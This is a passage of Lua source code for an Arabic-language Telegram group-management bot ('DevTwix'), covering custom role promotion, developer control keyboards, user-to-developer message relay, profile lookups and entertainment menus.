Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'DevTwix')..')'..' ❩\n⋄︙تم رفعه ❨ '..DEV_HmD..' ❩ بنجاح', 1, 'md')
DevHmD:set(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_HmD) 
DevHmD:sadd(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrHmD == "ادمن" and Admin(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'DevTwix')..')'..' ❩\n⋄︙تم رفعه ❨ '..DEV_HmD..' ❩ بنجاح', 1, 'md')
DevHmD:set(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_HmD)
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrHmD == "مدير" and Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'DevTwix')..')'..' ❩\n⋄︙تم رفعه ❨ '..DEV_HmD..' ❩ بنجاح', 1, 'md')
DevHmD:set(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_HmD)  
DevHmD:sadd(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrHmD == "عضو" then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'DevTwix')..')'..' ❩\n⋄︙تم رفعه ❨ '..DEV_HmD..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_HmD = text:match("تنزيل (.*)")
if DevHmD:sismember(DevTwix.."Coomds"..msg.chat_id_,DEV_HmD) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrHmD = DevHmD:get(DevTwix.."Comd:New:rt:HmD:"..DEV_HmD..msg.chat_id_)
if mrHmD == "مميز" and VipMem(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'DevTwix')..')'..' ❩\n⋄︙تم تنزيله ❨ '..DEV_HmD..' ❩ بنجاح', 1, 'md')
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevHmD:del(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrHmD == "ادمن" and Admin(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'DevTwix')..')'..' ❩\n⋄︙تم تنزيله ❨ '..DEV_HmD..' ❩ بنجاح', 1, 'md')
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:del(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrHmD == "مدير" and Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'DevTwix')..')'..' ❩\n⋄︙تم تنزيله ❨ '..DEV_HmD..' ❩ بنجاح', 1, 'md')
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevHmD:del(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrHmD == "عضو" then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'DevTwix')..')'..' ❩\n⋄︙تم تنزيله ❨ '..DEV_HmD..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevHmD:sismember(DevTwix.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrHmD = DevHmD:get(DevTwix.."Comd:New:rt:HmD:"..text1[2]..msg.chat_id_)
if mrHmD == "مميز" and VipMem(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..result.title_..'](t.me/'..(text1[3] or 'DevTwix')..')'..' ❩\n⋄︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevHmD:sadd(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:set(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrHmD == "ادمن" and Admin(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..result.title_..'](t.me/'..(text1[3] or 'DevTwix')..')'..' ❩\n⋄︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:set(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrHmD == "مدير" and Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..result.title_..'](t.me/'..(text1[3] or 'DevTwix')..')'..' ❩\n⋄︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevHmD:sadd(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
DevHmD:set(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrHmD == "عضو" then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..result.title_..'](t.me/'..(text1[3] or 'DevTwix')..')'..' ❩\n⋄︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevHmD:sismember(DevTwix.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrHmD = DevHmD:get(DevTwix.."Comd:New:rt:HmD:"..text1[2]..msg.chat_id_)
if mrHmD == "مميز" and VipMem(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..result.title_..'](t.me/'..(text1[3] or 'DevTwix')..')'..' ❩\n⋄︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.id_)
DevHmD:del(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrHmD == "ادمن" and Admin(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..result.title_..'](t.me/'..(text1[3] or 'DevTwix')..')'..' ❩\n⋄︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.id_)
DevHmD:del(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrHmD == "مدير" and Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..result.title_..'](t.me/'..(text1[3] or 'DevTwix')..')'..' ❩\n⋄︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.id_)
DevHmD:del(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrHmD == "عضو" then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو » ❨ ['..result.title_..'](t.me/'..(text1[3] or 'DevTwix')..')'..' ❩\n⋄︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
---------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevHmD:incr(DevTwix..'HmD:UsersMsgs'..DevTwix..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevHmD:incr(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevHmD:incr(DevTwix..'HmD:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevHmD:sismember(DevTwix.."HmD:Users",msg.chat_id_) then
DevHmD:sadd(DevTwix.."HmD:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
---------------------------------------------------------------------------------------
if ChatType == 'pv' then 
if text == '/start' or text == '× رجوع ×' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⋄︙*مرحبا بك في اوامر المطور الجاهزه*'
local key = {
{'× تغير المطور الاساسي ×'},
{'× تغير اسم البوت ×','× الاحصائيات ×'},
{'~ لوحة التفعيلات ~','~ لوحة الردود العامة ~'},
{'× المجموعات ×','× المطورين ×','× المشتركين ×'},
{'× تنظيف الكروبات ×','× تنظيف المشتركين ×'},
{'~ لوحة الاشتراك الاجباري ~'},
{'× قائمة العام ×','× ضع كليشة المطور ×'},
{'× اذاعة بالتثبيت ×'},
{'× اذاعة عامة ×','× اذاعة خاص ×'},
{'× أذاعة عامة بالتوجية ×','× أذاعة خاص بالتوجية ×'},
{'× نقل الاحصائيات ×','× جلب نسخه الكروبات ×'},
{'× روابط الكروبات ×'},
{'× تحديث السورس ×','× تحديث الملفات ×'},
{'× معلومات السيرفر ×'},
{'الغاء'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ لوحة التفعيلات ~' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⋄︙*مرحبا بك في اوامر التفعيلات ولتعطيل*'
local key = {
{'× تعطيل الاذاعة ×','× تفعيل الاذاعة ×'},
{'× تعطيل المغادرة ×','× تفعيل المغادرة ×'},
{'× تعطيل التواصل ×','× تفعيل التواصل ×'},
{'× تعطيل البوت خدمي ×','× تفعيل البوت خدمي ×'},
{'× تعطيل ترحيب البوت ×','× تفعيل ترحيب البوت ×'},
{'× تعطيل النسخة التلقائية ×','× تفعيل النسخة التلقائية ×'},
{'× رجوع ×'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ لوحة الاشتراك الاجباري ~' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⋄︙*مرحبا بك في اوامر الاشتراك الاجباري*'
local key = {
{'× قناة الاشتراك ×'},
{'× تفعيل الاشتراك ×','× تعطيل الاشتراك ×'},
{'× حذف قناه الاشتراك ×','× ضع قناة الاشتراك ×'},
{'× رجوع ×'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ لوحة الردود العامة ~' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⋄︙*مرحبا بك في لوحة الردود الكلية*'
local key = {
{'× مسح رد عام ×','× الردود العامة ×','× أضف رد عام ×'},
{'× مسح كليشة Start ×','× تغير كليشة Start ×'},
{'× تعين الايدي عام ×','× مسح الايدي العام ×'},
{'× تغير معلومات الترحيب ×'},
{'الغاء','× رجوع ×'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/Game' or text == '⋄ رجوع ⋄' then
local Sudo_Welcome = '*⋄︙مرحبأ بك يا عزيزي اليك العاب التسلية*'
local key = {
{'✧ الابراج اليومية ✧'},
{'✧ معرفي ✧','✧ اسمي ✧','✧ ايديي ✧'},
{'✧ العاب تسلية ✧'},
{'✧ صورتي ✧','✧ نبذتي ✧'},
{'✧ سورس البوت ✧','✧ مطور البوت ✧'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '✧ العاب تسلية ✧' then 
local Sudo_Welcome = '⋄︙*مرحبا عزيزي اليك العاب التسلية*'
local key = {
{'✧ نسبة المثلية ✧'},
{'✧ نسبة الجمال ✧','✧ نسبة الكره ✧','✧ نسبة الحب ✧'},
{'✧ نسبة الرجوله ✧','✧ نسبة الانوثه ✧'},
{'✧ نسبة الغباء ✧','✧ نسبة الجمال ✧'},
{'✧ نسبة الخيانه ✧','✧ نسبة التفاعل ✧'},
{'✧ كشف الحيوان ✧','✧ كشف الارتباط ✧'},
{'⋄ رجوع ⋄'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '✧ الابراج اليومية ✧' then 
local Text = '⋄︙*أهلا عزيزي قم بأختيار برجك الان .*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = "برج الجوزاء",callback_data=msg.sender_user_id_.."Getprjالجوزاء"},{text ="برج الثور",callback_data=msg.sender_user_id_.."Getprjالثور"},{text ="برج الحمل",callback_data=msg.sender_user_id_.."Getprjالحمل"}},
{{text = "برج العذراء",callback_data=msg.sender_user_id_.."Getprjالعذراء"},{text ="برج الاسد",callback_data=msg.sender_user_id_.."Getprjالاسد"},{text ="برج السرطان",callback_data=msg.sender_user_id_.."Getprjالسرطان"}},
{{text = "برج القوس",callback_data=msg.sender_user_id_.."Getprjالقوس"},{text ="برج العقرب",callback_data=msg.sender_user_id_.."Getprjالعقرب"},{text ="برج الميزان",callback_data=msg.sender_user_id_.."Getprjالميزان"}},
{{text = "برج الحوت",callback_data=msg.sender_user_id_.."Getprjالحوت"},{text ="برج الدلو",callback_data=msg.sender_user_id_.."Getprjالدلو"},{text ="برج الجدي",callback_data=msg.sender_user_id_.."Getprjالجدي"}},
{{text="• رجوع •",callback_data="/BackHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
---------------------------------------------------------------------------------------
if text == '/start' and ChCheck(msg) then  
if not DevHmD:get(DevTwix..'HmD:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local start = DevHmD:get(DevTwix.."HmD:Start:Bot")
local Text = "\n⋄︙مرحبأَ انا بوت إسمي "..NameBot.." 🧞‍♂️\n⋄︙لحماية المجموعات من السبام والتفليش والخ...\n⋄︙اضفني الى مجموعاتك {مشرف} ثم ارسل تفعيل\n\n⋄︙آرسل إمر { /Game } للعب دخل آلبوت . \n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ \n⋄︙[Channel Source DevTwix](t.me/devtwix) ."
keyboard = {} 
keyboard.inline_keyboard = {
{{text="˛ آلمطـور ᥀",callback_data="/DevHelpList:"..msg.sender_user_id_}},
{{text="˛ آضفني لمجموعتك ᥀",url="t.me/"..dp.username_.."?startgroup=botstart"}},}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end end
---------------------------------------------------------------------------------------
if not SecondSudo(msg) and not DevHmD:sismember(DevTwix..'HmD:Ban:Pv',msg.sender_user_id_) and not DevHmD:get(DevTwix..'HmD:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_HmD(msg.sender_user_id_, msg.id_, 1, '⋄︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "DevTwix")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'⋄︙تم ارسال الملصق من » \n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '⋄︙العضو » ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⋄︙تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevHmD:sadd(DevTwix..'HmD:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '⋄︙العضو » ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⋄︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevHmD:srem(DevTwix..'HmD:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_HmD(id_user, 0, 1, text, 1, "md")  
Text = '⋄︙تم ارسال الرساله الى » '
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '⋄︙تم ارسال الملصق الى » '
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '⋄︙تم ارسال الصوره الى » '
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '⋄︙تم ارسال المتحركه الى » '
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '⋄︙تم ارسال البصمه الى » '
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
---------------------------------------------------------------------------------------
if text and DevHmD:get(DevTwix..'HmD:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevHmD:del(DevTwix..'HmD:Start:Bots'..msg.sender_user_id_) 
return false
end
DevHmD:set(DevTwix.."HmD:Start:Bot",text)  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ كليشة الستارت', 1, 'md')
DevHmD:del(DevTwix..'HmD:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'تعيين رد الخاص' and ChCheck(msg) or text == 'ضع كليشه ستارت' and ChCheck(msg) or text == '× تغير كليشة Start ×' and ChCheck(msg) then 
DevHmD:set(DevTwix..'HmD:Start:Bots'..msg.sender_user_id_,true) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' and ChCheck(msg) or text == 'حذف كليشه ستارت' and ChCheck(msg) or text == '× مسح كليشة Start ×' and ChCheck(msg) then 
DevHmD:del(DevTwix..'Start:Bot') 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' and ChCheck(msg) or text == '» جلب رد الخاص ✧' and ChCheck(msg) then  
local start = DevHmD:get(DevTwix.."HmD:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "\n⋄︙مرحبأَ انا بوت إسمي "..NameBot.." 🧞‍♂️\n⋄︙لحماية المجموعات من السبام والتفليش والخ...\n⋄︙اضفني الى مجموعاتك {مشرف} ثم ارسل تفعيل\n\n⋄︙آرسل إمر { /Game } للعب دخل آلبوت . \n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ \n⋄︙[Channel Source DevTwix](t.me/devtwix) ."
end 
Dev_HmD(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' and ChCheck(msg) or text == '× تفعيل التواصل ×' and ChCheck(msg) then   
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙*تم تفعيل التواصل*",'md')
DevHmD:del(DevTwix..'HmD:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '× تعطيل التواصل ×' and ChCheck(msg) then  
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙*تم تعطيل التواصل*",'md')
DevHmD:set(DevTwix..'HmD:Texting:Pv',true) 
end
if Sudo(msg) then
if text == 'تفعيل النسخه التلقائيه' or text == 'تفعيل جلب نسخه الكروبات' or text == 'تفعيل عمل نسخه للمجموعات' or text == '× تفعيل النسخة التلقائية ×' then   
Dev_HmD(msg.chat_id_,msg.id_, 1, "⋄︙تم تفعيل جلب نسخة الكروبات التلقائيه\n\n⋄︙سيتم ارسال ملف نسخه تلقائية كل 24 ساعة",'md')
DevHmD:del(DevTwix.."HmD:Lock:AutoFile")
end
if text == 'تعطيل النسخه التلقائيه' or text == 'تعطيل جلب نسخه الكروبات' or text == 'تعطيل عمل نسخه للمجموعات' or text == '× تعطيل النسخة التلقائية ×' then  
Dev_HmD(msg.chat_id_,msg.id_, 1, "⋄︙تم تعطيل جلب النسخه التلقائية",'md')
DevHmD:set(DevTwix.."HmD:Lock:AutoFile",true) 
end
end
end
---------------------------------------------------------------------------------------
if text == "عدد المسح" or text == "تعين عدد المسح" or text == "تعيين عدد المسح" then  Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ فقط قم بارسال امر عدد المسح + عدد المسح \n⋄︙ مثال : عدد المسح 100', 1, 'md') end
if text == "انطق" then  Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ فقط قم بارسال امر انطق + الكلمه\n⋄︙سيقوم البوت بنطق الكلمه \n⋄︙ مثال : انطق هلو', 1, 'md') end
if text == "يوتيوب" and ChCheck(msg) or text == "اليوتيوب" and ChCheck(msg) or text == "» بوت اليوتيوب ✧" and ChCheck(msg) or text == "بوت اليوتيوب" and ChCheck(msg) or text == "اريد بوت يوتيوب" and ChCheck(msg) or text == "شمرلي بوت يوتيوب" and ChCheck(msg) or text == "يوت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/Y3lBot"}}} SendInline(msg.chat_id_,'⋄︙*اضغط للحصول على بوت اليوتيوب*',nil,inline) return false end
if text == "» بوت الزخرفه ✧" and ChCheck(msg) or text == "بوت الزخرفه" and ChCheck(msg) or text == "بوت زخرفه" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/Ul6bot"}}} SendInline(msg.chat_id_,'⋄︙*اضغط للحصول على بوت الزخرفه*',nil,inline) return false end
if text == "اهمس" and ChCheck(msg) or text == "» بوت الهمسه ✧" and ChCheck(msg) or text == "بوت الهمسه" and ChCheck(msg) or text == "همسه" and ChCheck(msg) or text == "اريد بوت الهمسه" and ChCheck(msg) or text == "دزلي بوت الهمسه" and ChCheck(msg) or text == "دزولي بوت الهمسه" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/Gi2bot"}}} SendInline(msg.chat_id_,'⋄︙*اضغط هنا للحصول على بوت همسة*',nil,inline) return false end
if text == "ايديي" and ChCheck(msg) or text == "✧ ايديي ✧" and ChCheck(msg) then Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙ايديك : `'..msg.sender_user_id_..'` ', 1, 'md') end
---------------------------------------------------------------------------------------
if text and (text == 'المطور' or text == 'مطور' or text == '✧ مطور البوت ✧') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,result)
local msg_id = msg.id_/2097152/0.5
Text = "⋄︙*Dev Name ⇠ * ["..result.first_name_.."](T.me/"..result.username_..")\n⋄︙*Dev User ⇠* [@"..result.username_.."]\n⋄︙*Dev Id* • `"..DevId.."`"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or DevTwix}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
---------------------------------------------------------------------------------------
if text == "معرفي" or text == "✧ معرفي ✧" then
function get_username(extra,result,success)
text = '⋄︙معرفك : User '
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "اسمي" or text == "✧ اسمي ✧" then
function get_firstname(extra,result,success)
text = "⋄︙اسمك : "..result.first_name_.." "
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end 
if text == 'نبذتي' or text == 'بايو' or text == '✧ نبذتي ✧' then
send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
end
if text == "صورتي" then
local my_ph = DevHmD:get(DevTwix.."HmD:Photo:Profile"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," ⋄︙الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ⋄︙عدد صورك » "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
if text == "✧ صورتي ✧" then
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ⋄︙عدد صورك » "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
---------------------------------------------------------------------------------------
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevHmD:incr(DevTwix..'HmD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevHmD:set(DevTwix.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevHmD:get(DevTwix.."HmD:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
